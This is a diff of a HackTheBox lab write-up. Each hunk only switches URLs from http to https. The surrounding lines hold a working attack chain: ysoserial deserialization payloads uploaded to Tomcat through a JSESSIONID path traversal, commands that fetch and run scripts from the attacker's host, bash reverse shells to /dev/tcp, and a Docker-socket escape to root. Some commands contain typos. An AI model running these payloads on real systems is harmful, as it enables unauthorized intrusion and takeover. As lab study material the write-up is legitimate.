@@ -55,7 +55,7 @@ tags: [Lab, HackTheBox]
    - (reverse shell code)
 
 8. create uploadfile.session
-   - curl http://10.10.15.118(your ip)/play1.sh -o /tmp/targetplay.sh
+   - curl https://10.10.15.118(your ip)/play1.sh -o /tmp/targetplay.sh
    - (upload the reverse shell code and store ie in /tmp/targetplay.sh)
 
 9. create executefile.session
@@ -68,9 +68,9 @@ tags: [Lab, HackTheBox]
     bash:
     vim curlcomand.sh
     # !/bin/bash
-    curl http://10.10.10.205:8080/upload.jsp -H 'Cookis:JESSIONID=../../../opt/samples/uploads/uploadfile' -F 'image=@uploadfile.session'
+    curl https://10.10.10.205:8080/upload.jsp -H 'Cookis:JESSIONID=../../../opt/samples/uploads/uploadfile' -F 'image=@uploadfile.session'
     sleep 1
-    curl http://10.10.10.205:8080/upload.jsp -H 'Cookis:JESSIONID=../../../opt/samples/uploads/executefile' -F 'image=@executefile.session'
+    curl https://10.10.10.205:8080/upload.jsp -H 'Cookis:JESSIONID=../../../opt/samples/uploads/executefile' -F 'image=@executefile.session'
 
 
 11. setup pyserver
@@ -178,8 +178,8 @@ CVE requirement:
     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEIvHOzBgCXIy0Zlj
     Accept: */*
-    Origin: http://10.10.10.205:8080
-    Referer: http://10.10.10.205:8080/service/
+    Origin: https://10.10.10.205:8080
+    Referer: https://10.10.10.205:8080/service/
     Accept-Encoding: gzip, deflate
     Accept-Language: en-US,en;q=0.9
     Cookie: JSESSIONID=574DF69D0EA6E893D165D86BC9401D5B
@@ -286,9 +286,9 @@ executefile.session (execute the targetplay.sh)
     # Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
 
     # 2. create seialized session file to download our payload with curl
-    java -jar ysoserial.jar CommonsCollections2 "curl http://(your ip)/play1.sh -o /tmp/targetplay.sh" > uploadfile.session
+    java -jar ysoserial.jar CommonsCollections2 "curl https://(your ip)/play1.sh -o /tmp/targetplay.sh" > uploadfile.session
 
-    java -jar ysoserial.jar CommonsCollections2 "curl http://10.10.15.118/play1.sh -o /tmp/targetplay.sh" > uploadfile.session
+    java -jar ysoserial.jar CommonsCollections2 "curl https://10.10.15.118/play1.sh -o /tmp/targetplay.sh" > uploadfile.session
 
     # 3. create second serizlized session file to execute the payload
     java -jar ysoserial.jar CommonsCollections2 "bash /tmp/targetplay.sh" > executefile.session
@@ -299,9 +299,9 @@ executefile.session (execute the targetplay.sh)
 ```bash
 # vim curlcomand.sh
 # !/bin/bash
-curl http://10.10.10.205:8080/upload.jsp -H 'Cookis:JESSIONID=../../../tmp/uploadfile' -F 'image=@uploadfile.session'
+curl https://10.10.10.205:8080/upload.jsp -H 'Cookis:JESSIONID=../../../tmp/uploadfile' -F 'image=@uploadfile.session'
 sleep 1
-curl http://10.10.10.205:8080/upload.jsp -H 'Cookis:JESSIONID=../../../tmp/executefile' -F 'image=@executefile.session'
+curl https://10.10.10.205:8080/upload.jsp -H 'Cookis:JESSIONID=../../../tmp/executefile' -F 'image=@executefile.session'
 ```
 
 4. setup listener for the reverse shell and webserver for the payload downloaded by the target
@@ -353,10 +353,10 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 "$hexout" > /tmp/
 echo $file
 
 #upload the payload
-curl -s -F "data=@/tmp/$file.session" http://10.10.10.205:8080/upload.jsp?email=bob@bob.com > /dev/null
+curl -s -F "data=@/tmp/$file.session" https://10.10.10.205:8080/upload.jsp?email=bob@bob.com > /dev/null
 
 #reference payload in cookie
-curl -s  -H "Cookie: JSESSIONID=../../../../../../../../../../opt/samples/uploads/$file" http://10.10.10.205:8080/ > /dev/null
+curl -s  -H "Cookie: JSESSIONID=../../../../../../../../../../opt/samples/uploads/$file" https://10.10.10.205:8080/ > /dev/null
 
 
 ip=x.x.x.x
@@ -399,7 +399,7 @@ pyserver
 
 
 # tab2: Tomcat
-curl http://10.10.10.10/exploit.pu -o exploit.py
+curl https://10.10.10.10/exploit.pu -o exploit.py
 python exploit.py
 # module not found on the target system
 # use reverse portforwarding on port 4506 to run the exploit locally
@@ -416,7 +416,7 @@ curl https://o.jpillora.com/chisel! | bash
 # install in /usr.local/bin/chsel
 
 # tab2: Tomcat
-curl http://10.10.10.10/chisel -o chisel
+curl https://10.10.10.10/chisel -o chisel
 chmod +x chisel
 
 ./chisel client 110.10.10.10:9999 R:4506:localhost:4506
@@ -443,7 +443,7 @@ nc -lvnp 7878
 cat todo.txt
 
 cat ./bash_history
-curl -s --unix-socket /var/run/docker.sock http://localhost/image/json
+curl -s --unix-socket /var/run/docker.sock https://localhost/image/json
 # docker is accessible
 # can run curl with unix socket to communicate with docker.sock
 # Docker.sock allow us to create docker
@@ -471,11 +471,11 @@ cmd-"[\"/bin/sh\",\"-c\",\"chroot /tmp sh -c \\\"bash -c 'bash -i >& /dev/tcp/10
 # create the container and execute command, bind the root filesystem to it
 # name the container 'na5c4r_root'
 # -d: detached
-curl -s -X POST --unix-socket /var/run/docker.sock -d "{\"Image:\":\"sandbox\",\"cmd\":$cmd.\"Binds\":[\"/:tmp:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create?name=na5c4r_root
+curl -s -X POST --unix-socket /var/run/docker.sock -d "{\"Image:\":\"sandbox\",\"cmd\":$cmd.\"Binds\":[\"/:tmp:rw\"]}" -H 'Content-Type: application/json' https://localhost/containers/create?name=na5c4r_root
 
 
 # start the container
-curl -s -X POST --unix-socket /var/run/docker.sock -d "http://localhost/containers/na5c4r_root/start"
+curl -s -X POST --unix-socket /var/run/docker.sock -d "https://localhost/containers/na5c4r_root/start"
 # ----------------
 
 
@@ -485,7 +485,7 @@ pyserver
 
 # tab2: Tomcat
 mkdir .na5c4r
-curl http://10.10.10.10/exploitsock.sh -o exploitsock.sh
+curl https://10.10.10.10/exploitsock.sh -o exploitsock.sh
 chmod -x exploitsock.sh
 bash exploitsock.sh
 
@@ -518,8 +518,8 @@ cmd="bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
 jex="bash -c {echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}"
 java -jar ysoserial.jar CommonsCollections4 "$jex" > /tmp/$filename.session
 
-curl -s -F "data=@/tmp/$filename.session" http://10.10.10.205:8080/upload.jsp?email=test@mail.com > /dev/null
-curl -s http://10.10.10.205:8080/ -H "Cookie: JSESSIONID=../../../../../../../../../../opt/samples/uploads/$filename" > /dev/null
+curl -s -F "data=@/tmp/$filename.session" https://10.10.10.205:8080/upload.jsp?email=test@mail.com > /dev/null
+curl -s https://10.10.10.205:8080/ -H "Cookie: JSESSIONID=../../../../../../../../../../opt/samples/uploads/$filename" > /dev/null
 
 # start nc listener:
 nc -lvnp <port>
@@ -533,7 +533,7 @@ cat ~/user.txt
 
 
 
-running reverse shell normally wont work because of javas Runtime.exec(), so we have to create a workaround (http://www.jackson-t.ca/runtime-exec-payloads.html)
+running reverse shell normally wont work because of javas Runtime.exec(), so we have to create a workaround (https://www.jackson-t.ca/runtime-exec-payloads.html)
 - try by entering normal payload e.g. `bash -i >& /dev/tcp/<ip>/<port> 0>&1`
 
 
